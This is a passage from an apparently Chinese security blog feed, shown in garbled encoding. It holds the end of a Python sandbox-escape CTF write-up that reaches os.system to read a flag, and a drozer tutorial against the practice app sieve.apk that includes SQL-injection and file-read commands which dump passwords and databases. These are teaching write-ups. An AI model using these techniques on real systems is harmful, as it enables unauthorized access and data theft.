[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.keys().index(&apos;system&apos;)</span><br><span class="line">144</span><br></pre></td></tr></table></figure></p><p>æ•´ç†ä¸€ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a=[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12]</span><br><span class="line">&gt;&gt;&gt; a</span><br><span class="line">&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; s=a.__dict__.keys().index(&apos;system&apos;)</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">144</span><br><span class="line">&gt;&gt;&gt; s=a.__dict__.keys()[144]</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">&apos;system&apos;</span><br><span class="line">&gt;&gt;&gt; s=a.__dict__.values()[144]</span><br><span class="line">&gt;&gt;&gt; s(&apos;pwd&apos;)</span><br><span class="line">/home/xxxx/Desktop/code/python-code/test</span><br></pre></td></tr></table></figure></p><p>å¥½äº†ç°åœ¨å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤äº†ï¼Œcatä¸€ä¸‹flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s(&apos;cat flag.txt&apos;)</span><br><span class="line">This is a Flag&#123;enjoy_yourself_ctfer&#125;</span><br></pre></td></tr></table></figure></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>é€šè¿‡ä¸Šé¢çš„pythonæ²™ç›’é€ƒé€¸ï¼Œå‘ç°è¯»pythonå®˜ç½‘æ‰‹å†Œè¿˜æ˜¯å¾ˆæœ‰å¿…è¦çš„ï¼Œæ‰¾ä¸ªæ—¶é—´ä¸€ç‚¹ä¸€ç‚¹çœ‹ï¼šï¼‰å…±å‹‰</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://hexplo.it/escaping-the-csawctf-python-sandbox/" target="_blank" rel="noopener">https://hexplo.it/escaping-the-csawctf-python-sandbox/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚è¿°&quot;&gt;&lt;/a&gt;æ¦‚è¿°&lt;/h1&gt;&lt;p&gt;å‰å‡ å¤©çš„åå±±æ¯å‡ºäº†ä¸€é“pythonçš„æ²™ç›’é€ƒé€¸ï¼Œæ„Ÿè§‰æŒºæœ‰æ„æ€çš„ã€‚åœ¨ç½‘ä¸Šæœç´¢äº†ä¸€ä¸‹ï¼Œå‘ç°å¾ˆæ—©å°±å‡ºè¿‡è¿™ç§ç±»å‹çš„é¢˜ï¼Œæºç éƒ½å·®ä¸å¤šã€‚å­¦ä¹ äº†ä¸€ä¸‹æ€è·¯ï¼Œè¿™é‡Œæ€»ç»“ä¸€ä¸‹ï¼šï¼‰&lt;/p&gt;
    
    </summary>
    
      <category term="notes" scheme="http://blog.0kami.cn/categories/notes/"/>
    
    
      <category term="vul" scheme="http://blog.0kami.cn/tags/vul/"/>
    
  </entry>
  
  <entry>
    <title>ã€MOBILEã€‘how to install drozer on mac</title>
    <link href="http://blog.0kami.cn/2016/08/20/old-how-to-install-drozer-on-mac/"/>
    <id>http://blog.0kami.cn/2016/08/20/old-how-to-install-drozer-on-mac/</id>
    <published>2016-08-20T07:19:13.000Z</published>
    <updated>2018-01-25T07:21:15.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä¸€ï¼šæ¦‚è¿°"><a href="#ä¸€ï¼šæ¦‚è¿°" class="headerlink" title="ä¸€ï¼šæ¦‚è¿°"></a>ä¸€ï¼šæ¦‚è¿°</h1><p>drozeræ˜¯ä¸€æ¬¾é’ˆå¯¹Androidç³»ç»Ÿçš„å®‰å…¨æµ‹è¯•æ¡†æ¶ã€‚drozerå¯ä»¥å¸®åŠ©Android appå’Œè®¾å¤‡å˜å¾—æ›´å®‰å…¨ï¼Œå…¶æä¾›äº†å¾ˆå¤šAndroidå¹³å°ä¸‹çš„æ¸—é€æµ‹è¯•exploitä¾›ä½ ä½¿ç”¨å’Œåˆ†äº«ã€‚å¯¹äºè¿œç¨‹çš„exploitï¼Œå®ƒå¯ä»¥ç”Ÿæˆshellcodeå¸®åŠ©ä½ è¿›è¡Œè¿œç¨‹è®¾å¤‡ç®¡ç†ã€‚</p><ol><li>æ›´å¿«çš„Androidå®‰å…¨è¯„ä¼°<br>drozerå¯ä»¥å¤§å¤§ç¼©å‡Androidå®‰å…¨è¯„ä¼°çš„è€—æ—¶ï¼Œé€šè¿‡æ”»å‡»æµ‹è¯•æš´éœ²Android APPçš„æ¼æ´ã€‚</li><li>åŸºäºçœŸæœºçš„æµ‹è¯•<br>drozerè¿è¡Œåœ¨Androidæ¨¡æ‹Ÿå™¨å’ŒçœŸå®è®¾å¤‡ä¸Šï¼Œå®ƒåªéœ€è¦USBè°ƒè¯•å³å¯ä½¿ç”¨ã€‚</li><li>è‡ªåŠ¨åŒ–å’Œæ‰©å±•<br>drozeræœ‰å¾ˆå¤šæ‰©å±•æ¨¡å—ï¼Œä½ å¯ä»¥æ‰¾åˆ°ä»–ä»¬è¿›è¡Œæµ‹è¯•ä»¥å‘ç°Androidå®‰å…¨é—®é¢˜ã€‚<a id="more"></a></li></ol><h1 id="äºŒï¼šå®‰è£…"><a href="#äºŒï¼šå®‰è£…" class="headerlink" title="äºŒï¼šå®‰è£…"></a>äºŒï¼šå®‰è£…</h1><p>drozerä¸‹è½½é“¾æ¥ï¼š<a href="https://github.com/mwrlabs/drozer" target="_blank" rel="noopener">https://github.com/mwrlabs/drozer</a></p><blockquote><p>windowå’ŒLinuxä¸‹çš„å®‰è£…è¦ç®€å•çš„å¤šï¼Œä½†æ˜¯åœ¨macä¸Šå®‰è£…æ—¶é‡åˆ°äº†ä¸€äº›é”™è¯¯ï¼Œå› æ­¤å°†è‡ªå·±çš„å®‰è£…æ­¥éª¤è®°å½•ä¸‹æ¥ã€‚</p></blockquote><p>å› ä¸ºæ˜¯ç”¨pythonå†™çš„ï¼Œæ‰€ä»¥Macå¯ä»¥ä¸‹è½½python.eggæ–‡ä»¶è¿›è¡Œå®‰è£…ã€‚ä½†æ˜¯æƒ³é€šè¿‡<code>easy_install</code>å®‰è£…ï¼Œå¿…é¡»æ‹¥æœ‰ä»¥ä¸‹è¿™äº›æ¨¡å—ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cffi==1.1.2  </span><br><span class="line">cryptography==0.9.3  </span><br><span class="line">drozer==2.3.4  </span><br><span class="line">enum34==1.0.4  </span><br><span class="line">idna==2.0  </span><br><span class="line">ipaddress==1.0.14  </span><br><span class="line">protobuf==2.4.1  </span><br><span class="line">pyasn1==0.1.8  </span><br><span class="line">pycparser==2.14  </span><br><span class="line">pyOpenSSL==0.13  </span><br><span class="line">six==1.9.0  </span><br><span class="line">Twisted==10.2.0</span><br></pre></td></tr></table></figure><p>è€Œå®‰è£…è¿‡ç¨‹ä¸­ä¸»è¦çš„é”™è¯¯æ˜¯ç”±pyOpenSSLé€ æˆçš„ã€‚</p><h3 id="1-1-å®‰è£…openssl"><a href="#1-1-å®‰è£…openssl" class="headerlink" title="1.1 å®‰è£…openssl"></a>1.1 å®‰è£…openssl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ brew uninstall openssl #if installed already</span><br><span class="line">$ brew install openssl</span><br></pre></td></tr></table></figure><h3 id="1-2-ç¼–è¯‘pyOpenSSL"><a href="#1-2-ç¼–è¯‘pyOpenSSL" class="headerlink" title="1.2 ç¼–è¯‘pyOpenSSL"></a>1.2 ç¼–è¯‘pyOpenSSL</h3><p>ä¸å¹¸çš„æ˜¯åœ¨åé¢å®‰è£…Python.eggè¿˜æ˜¯ä¼šæŠ¥é”™,åŸå› æ˜¯Drozeréœ€è¦ç‰¹æ®Šç‰ˆæœ¬çš„opensslï¼Œæˆ‘ä»¬éœ€è¦ä¸‹è½½ pyOpenSSL v0.13ï¼Œç„¶åç”¨<code>sed</code>æŒ‡ä»¤ä¿®å¤typoï¼Œå…·ä½“æŒ‡ä»¤ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://pypi.python.org/packages/source/p/pyOpenSSL/pyOpenSSL-0.13.tar.gz</span><br><span class="line">$ tar xzvf pyOpenSSL-0.13.tar.gz</span><br><span class="line">$ cd pyOpenSSL-0.13</span><br><span class="line">$ sed -i &apos;&apos; &apos;s/X509_REVOKED_dup/X509_REVOKED_dupe/&apos; OpenSSL/crypto/crl.c</span><br></pre></td></tr></table></figure></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬build OpenSSLï¼Œè¿™é‡Œéœ€è¦æŒ‡æ˜æœ¬æœºä¸­OpenSSL headersæ–‡ä»¶çš„ä½ç½®ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python setup.py build_ext -L/usr/local/opt/openssl/lib -I/usr/local/opt/openssl/include</span><br><span class="line">$ python setup.py build</span><br><span class="line">$ python setup.py install</span><br></pre></td></tr></table></figure></p><h3 id="1-3-å®‰è£…å…¶ä»–æ”¯æ’‘æ–‡ä»¶"><a href="#1-3-å®‰è£…å…¶ä»–æ”¯æ’‘æ–‡ä»¶" class="headerlink" title="1.3 å®‰è£…å…¶ä»–æ”¯æ’‘æ–‡ä»¶"></a>1.3 å®‰è£…å…¶ä»–æ”¯æ’‘æ–‡ä»¶</h3><p>ç»ˆäºè¿›å…¥å®‰è£…è¯´æ˜æ–‡æ¡£ä¸­çš„æ­¥éª¤äº†<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo easy_install --allow-hosts pypi.python.org protobuf==2.4.1</span><br><span class="line">$ sudo easy_install twisted==10.2.0 #ignore any warnings/errors, it works</span><br></pre></td></tr></table></figure></p><h3 id="1-4-å®‰è£…drozer"><a href="#1-4-å®‰è£…drozer" class="headerlink" title="1.4 å®‰è£…drozer"></a>1.4 å®‰è£…drozer</h3><p>æœ€åä¸€æ­¥ï¼Œinstall drozer<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo easy_install ./drozer-2.3.4-py2.7.egg</span><br></pre></td></tr></table></figure></p><h3 id="1-5-runnning"><a href="#1-5-runnning" class="headerlink" title="1.5 runnning"></a>1.5 runnning</h3><p>æ­¤æ—¶å¯ä»¥åœ¨ä»»ä½•ç›®å½•ä¸‹ä½¿ç”¨drozer å‘½ä»¤å•¦ï¼</p><h1 id="ä¸‰ï¼šDrozerå…¥é—¨â€”-è·å–App-Packageä¿¡æ¯"><a href="#ä¸‰ï¼šDrozerå…¥é—¨â€”-è·å–App-Packageä¿¡æ¯" class="headerlink" title="ä¸‰ï¼šDrozerå…¥é—¨â€” è·å–App Packageä¿¡æ¯"></a>ä¸‰ï¼šDrozerå…¥é—¨â€” è·å–App Packageä¿¡æ¯</h1><p><strong><em>æ­¤å¤„ä»¥<a href="https://www.mwrinfosecurity.com/system/assets/380/original/sieve.apk" target="_blank" rel="noopener">sieve.apk</a>ä¸ºä¾‹</em></strong></p><p>drozeræ¯ä¸ªæ¨¡å—çš„ä½œç”¨ï¼š</p><p><img src="http://blog.0kami.cn/img/drozer/imag1.png" alt=""></p><p>è·å–AppåŒ…ä¿¡æ¯çš„æ¨¡å—æ˜¯ <em>**</em> app.package.* :</p><h3 id="2-1-è·å–è·å–Androidè®¾å¤‡ä¸Šçš„æ‰€æœ‰çš„å®‰è£…çš„Appçš„åŒ…å"><a href="#2-1-è·å–è·å–Androidè®¾å¤‡ä¸Šçš„æ‰€æœ‰çš„å®‰è£…çš„Appçš„åŒ…å" class="headerlink" title="2.1 è·å–è·å–Androidè®¾å¤‡ä¸Šçš„æ‰€æœ‰çš„å®‰è£…çš„Appçš„åŒ…å"></a>2.1 è·å–è·å–Androidè®¾å¤‡ä¸Šçš„æ‰€æœ‰çš„å®‰è£…çš„Appçš„åŒ…å</h3><p>å‘½ä»¤æ˜¯ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.info -a com.mwr.example.sieve run app.package.list</span><br></pre></td></tr></table></figure></p><p>è¿™æ¡å‘½ä»¤ä¼šæŠŠæ‰€æœ‰çš„Appéƒ½åˆ—å‡ºæ¥ï¼Œå¦‚æœæƒ³å…·ä½“æŸ¥æ‰¾æŸä¸ªAppå¯åŠ ä¸Š-f [Appå…³é”®å­—]çš„å‚æ•°ï¼Œå¦‚æŸ¥æ‰¾sieveåœ¨Androidè®¾å¤‡ä¸­çš„åŒ…åï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.list -f sieve</span><br></pre></td></tr></table></figure></p><h3 id="2-2-è·å–Sieveçš„ä¸€äº›åŸºæœ¬ä¿¡æ¯"><a href="#2-2-è·å–Sieveçš„ä¸€äº›åŸºæœ¬ä¿¡æ¯" class="headerlink" title="2.2 è·å–Sieveçš„ä¸€äº›åŸºæœ¬ä¿¡æ¯"></a>2.2 è·å–Sieveçš„ä¸€äº›åŸºæœ¬ä¿¡æ¯</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure><p><img src="http://blog.0kami.cn/img/drozer/imag2.png" alt=""></p><h3 id="2-3-Itentify-The-Attack-Surface-ç¡®å®šæ”»å‡»é¢"><a href="#2-3-Itentify-The-Attack-Surface-ç¡®å®šæ”»å‡»é¢" class="headerlink" title="2.3 Itentify The Attack Surface(ç¡®å®šæ”»å‡»é¢)"></a>2.3 Itentify The Attack Surface(ç¡®å®šæ”»å‡»é¢)</h3><p>è¿™ä¸ªæµ‹è¯•æ•™ç¨‹ä¸»è¦å…³æ³¨çš„æ˜¯Android å›ºæœ‰çš„IPCé€šä¿¡æœºåˆ¶çš„è„†å¼±æ€§ï¼Œè¿™äº›ç‰¹ç‚¹å¯¼è‡´äº†Appæ³„æ¼æ•æ„Ÿä¿¡æ¯ç»™åŒä¸€å°è®¾å¤‡ä¸Šçš„å…¶å®ƒAppã€‚ æŸ¥æ‰¾å¯ä»¥è¿›è¡ŒAttack Surfaceçš„ç»„ä»¶çš„å‘½ä»¤ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.attacksurface com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.0kami.cn/img/drozer/imag3.png" alt=""><br>ç»“æœæ˜¾ç¤ºäº†æ½œåœ¨å¯ä»¥åˆ©ç”¨çš„ç»„ä»¶ä¸ªæ•°ï¼š â€œexportedâ€è¡¨ç¤ºç»„ä»¶å¯ä»¥è¢«å…¶ä»–Appä½¿ç”¨ã€‚ services is debuggableè¡¨ç¤ºæˆ‘ä»¬å¯ä»¥ç”¨adbç»‘å®šä¸€ä¸ªè°ƒè¯•å™¨åˆ°è¿›ç¨‹ã€‚</p><h3 id="2-4-è¿›ä¸€æ­¥è·å–Attack-Surfaceçš„ä¿¡æ¯"><a href="#2-4-è¿›ä¸€æ­¥è·å–Attack-Surfaceçš„ä¿¡æ¯" class="headerlink" title="2.4 è¿›ä¸€æ­¥è·å–Attack Surfaceçš„ä¿¡æ¯"></a>2.4 è¿›ä¸€æ­¥è·å–Attack Surfaceçš„ä¿¡æ¯</h3><p>å¦‚è¿›ä¸€æ­¥è·å–ativityç»„å»ºçš„attack surfaceä¿¡æ¯çš„å‘½ä»¤æ˜¯ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.0kami.cn/img/drozer/imag4.png" alt=""></p><h3 id="2-5-å¯åŠ¨Activities"><a href="#2-5-å¯åŠ¨Activities" class="headerlink" title="2.5 å¯åŠ¨Activities"></a>2.5 å¯åŠ¨Activities</h3><p>ä¸Šå›¾çš„PWListå’ŒFileSelectActivityæ˜¯exportedå¹¶ä¸”ä¸éœ€è¦ä»»ä½•æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨drozerå¯åŠ¨ä»–ä»¬ï¼Œæ¯”å¦‚æ„Ÿè§‰PWListè¿™ä¸ªå«é‡‘é‡åº”è¯¥å¤§ä¸€ç‚¹ï¼Œæ‰€ä»¥å°±å¯åŠ¨å®ƒäº†ï¼Œå‘½ä»¤æ˜¯ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start â€“component com.mwr.example.sieve com.mwr.example.sieve.PWList</span><br></pre></td></tr></table></figure></p><h3 id="2-6-ä»Content-Providerä¸­è·å–ä¿¡æ¯"><a href="#2-6-ä»Content-Providerä¸­è·å–ä¿¡æ¯" class="headerlink" title="2.6 ä»Content Providerä¸­è·å–ä¿¡æ¯"></a>2.6 ä»Content Providerä¸­è·å–ä¿¡æ¯</h3><p>æ¥ä¸Š2.3èŠ‚ï¼Œè¿›ä¸€æ­¥è·å–<code>content provider</code>çš„<code>attact surface</code>çš„ä¿¡æ¯çš„å‘½ä»¤æ˜¯ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.0kami.cn/img/drozer/imag5.png" alt=""><br>ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°2.3èŠ‚ä¸­ä¸¤ä¸ªexportedçš„<code>content provider</code>çš„å…·ä½“ä¿¡æ¯ï¼ŒåŒ…æ‹¬åå­—ï¼Œæƒé™ï¼Œè®¿é—®è·¯å¾„ç­‰ã€‚</p><h5 id="2-6-1-æŸ¥æ‰¾å¯ä»¥è®¿é—®Content-Providerçš„URIï¼ˆæ•°æ®æ³„æ¼ï¼‰"><a href="#2-6-1-æŸ¥æ‰¾å¯ä»¥è®¿é—®Content-Providerçš„URIï¼ˆæ•°æ®æ³„æ¼ï¼‰" class="headerlink" title="2.6.1 æŸ¥æ‰¾å¯ä»¥è®¿é—®Content Providerçš„URIï¼ˆæ•°æ®æ³„æ¼ï¼‰"></a>2.6.1 æŸ¥æ‰¾å¯ä»¥è®¿é—®Content Providerçš„URIï¼ˆæ•°æ®æ³„æ¼ï¼‰</h5><p>ä»ä¸ŠèŠ‚å›¾ä¸­æˆ‘ä»¬çŒœæµ‹DBContentProviderä¼šæœ‰æŸç§æ ¼å¼çš„æ•°æ®åº“ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“å…¶ä¸­çš„æ•°æ®æ˜¯å¦‚ä½•ç»„ç»‡çš„ã€‚Content URIå¿…é¡»æ˜¯ â€œcontent:///â€ çš„å½¢å¼,å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ éƒ¨åˆ†çš„content URIsæ¥è®¿é—®DBcontent Providerã€‚ ä¸Šå›¾å­˜åœ¨ä¸€ä¸ªéœ€è¦READ_KEYSå’ŒWRITE_KEYSæƒé™æ‰èƒ½è¯»å’Œå†™çš„â€œ/Keysâ€çš„è·¯å¾„ã€‚<br>drozerçš„scanneræ¨¡å—æä¾›äº†ä¸€äº›æ–¹æ³•å»çŒœæµ‹å¯èƒ½å­˜åœ¨çš„content URIsï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.finduris -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.0kami.cn/img/drozer/imag6.png" alt=""><br>ä¸Šå›¾ä¸­æ£€æµ‹å‡ºäº†å¯ä»¥è®¿é—®contentçš„URIï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥ç”¨drozerçš„å…¶ä»–æ¨¡å—å’ŒURIä»contentä¸­è·å–ï¼Œç”šè‡³æ›´æ”¹ä¿¡æ¯ã€‚ å¦‚ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ â€“vertical</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.0kami.cn/img/drozer/imag7.png" alt=""><br>å¦‚ä¸Šå›¾æˆ‘ä»¬è·å–äº†ç”¨æˆ·åï¼Œé‚®ç®±å¸å·ï¼Œå’ŒBase64ç¼–ç çš„å¯†ç å­—ç¬¦ä¸²ã€‚</p><h5 id="2-6-2-è¿›è¡ŒSQLæ³¨å…¥"><a href="#2-6-2-è¿›è¡ŒSQLæ³¨å…¥" class="headerlink" title="2.6.2 è¿›è¡ŒSQLæ³¨å…¥"></a>2.6.2 è¿›è¡ŒSQLæ³¨å…¥</h5><p>Androidæ“ä½œç³»ç»Ÿå»ºè®®ä½¿ç”¨SQLiteæ•°æ®åº“å­˜å‚¨ç”¨æˆ·æ•°æ®ã€‚SQLiteæ•°æ®åº“ä½¿ç”¨SQLè¯­å¥ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡ŒSQLæ³¨å…¥ã€‚ ä½¿ç”¨<code>projection</code>å‚æ•°å’Œ<code>seleciton</code>å‚æ•°å¯ä»¥ä¼ é€’ä¸€äº›ç®€å•çš„SQLæ³¨å…¥è¯­å¥åˆ°Content providerã€‚å¦‚ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ â€“projection â€œâ€˜â€</span><br><span class="line"></span><br><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ â€“selection â€œâ€˜â€</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.0kami.cn/img/drozer/imag8.png" alt=""><br>ä¸Šé¢ä¸¤æ¡å‘½ä»¤æ‰§è¡ŒåAndroidè®¾å¤‡è¿”å›äº†éå¸¸è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯ã€‚<br>ä½¿ç”¨Sqlæ³¨å…¥åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ‰€æœ‰æ•°æ®è¡¨ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ â€“projection â€œ* FROM SQLITE_MASTER WHERE type=â€™tableâ€™;â€“â€œ</span><br></pre></td></tr></table></figure></p><p>ä½¿ç”¨SQLæ³¨å…¥åˆ—å‡ºæ•°æ®è¡¨çš„å†…å®¹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ â€“projection â€œ* FROM Key;â€“â€œ</span><br></pre></td></tr></table></figure></p><p>ä½¿ç”¨SQLæ³¨å…¥åˆ—å‡ºæ•°æ®è¡¨çš„å†…å®¹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ â€“projection â€œ* FROM Key;â€“â€œ</span><br></pre></td></tr></table></figure></p><h5 id="2-6-3-ä»File-System-Backed-Content-Providersè·å–ä¿¡æ¯"><a href="#2-6-3-ä»File-System-Backed-Content-Providersè·å–ä¿¡æ¯" class="headerlink" title="2.6.3 ä»File System-Backed Content Providersè·å–ä¿¡æ¯"></a>2.6.3 ä»File System-Backed Content Providersè·å–ä¿¡æ¯</h5><p><code>File System-backed Content Provider</code>æä¾›äº†è®¿é—®åº•å±‚æ–‡ä»¶ç³»ç»Ÿçš„æ–¹æ³•ï¼ŒAndroidæ²™ç›’ä¼šé˜»æ­¢Appå…±äº«æ–‡ä»¶å…è®¸ï¼Œè€ŒFile System-backed Content Providerå…è®¸Appå…±äº«æ–‡ä»¶ã€‚ å¯¹äºsieveæ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥æ¨æµ‹å‡ºçš„<code>FileBackupProvider</code>å°±æ˜¯ä¸€ä¸ªfile system-backed content providerã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨drozerçš„app.provider.readæ¨¡å—æŸ¥çœ‹æŸä¸ªæ–‡ä»¶ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥ä½¿ç”¨<code>app.provider.download</code>ä¸‹è½½æ–‡ä»¶<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/user/database.db</span><br></pre></td></tr></table></figure></p><h5 id="2-6-4-æ£€æŸ¥Content-Providerçš„è„†å¼±æ€§"><a href="#2-6-4-æ£€æŸ¥Content-Providerçš„è„†å¼±æ€§" class="headerlink" title="2.6.4 æ£€æŸ¥Content Providerçš„è„†å¼±æ€§"></a>2.6.4 æ£€æŸ¥Content Providerçš„è„†å¼±æ€§</h5><p>æ£€æŸ¥æ˜¯å¦æœ‰SQLæ³¨å…¥ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.injection -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p>æ£€æŸ¥æ˜¯å¦å­˜åœ¨éå†æ–‡ä»¶çš„æ¼æ´<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.traversal -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p><strong><em>æ€»ç»“ä½“ä¼šï¼šæˆ‘è§‰å¾—åœ¨åˆšå¼€å§‹è·å–äº†è½¯ä»¶åŒ…çš„åŸºæœ¬ä¿¡æ¯åï¼Œå°±å…ˆç”¨æ¨¡å—scanneré‡Œé¢çš„å·¥å…·æ‰«ä¸€æ‰«ï¼Œæ‰¾åˆ°ä¸€äº›æ¼æ´æˆ–è€…åˆ©ç”¨ç‚¹åå†è¿›è¡Œä¸‹ä¸€æ­¥ã€‚</em></strong></p><h3 id="2-7-å’ŒServicesäº¤äº’"><a href="#2-7-å’ŒServicesäº¤äº’" class="headerlink" title="2.7 å’ŒServicesäº¤äº’"></a>2.7 å’ŒServicesäº¤äº’</h3><p>è·å–æ˜¯exportedçŠ¶æ€çš„servicesçš„å‘½ä»¤ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p>å…³äºServicesçš„æ¨¡å—ï¼š<br>å¦‚å‘æŸä¸ªæœåŠ¡å‘é€ä¿¡æ¯ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService â€“msg 1 5 3</span><br></pre></td></tr></table></figure></p><h3 id="2-8-å…¶ä»–å¸¸ç”¨æ¨¡å—"><a href="#2-8-å…¶ä»–å¸¸ç”¨æ¨¡å—" class="headerlink" title="2.8 å…¶ä»–å¸¸ç”¨æ¨¡å—"></a>2.8 å…¶ä»–å¸¸ç”¨æ¨¡å—</h3><ul><li>shell.start åœ¨Androidè®¾å¤‡ä¸Šå¼€å¯ä¸€ä¸ªäº¤äº’å¼Linux Shell</li><li>tools.file.upload / tools.file.downloa</li><li>tools.setup.busybox / tools.setup.minimalsu å®‰ è£…busyboxæˆ–è€…minimalsuåˆ°Androidè®¾å¤‡ä¸Š</li></ul><p>å‚è€ƒé“¾æ¥ï¼š<a 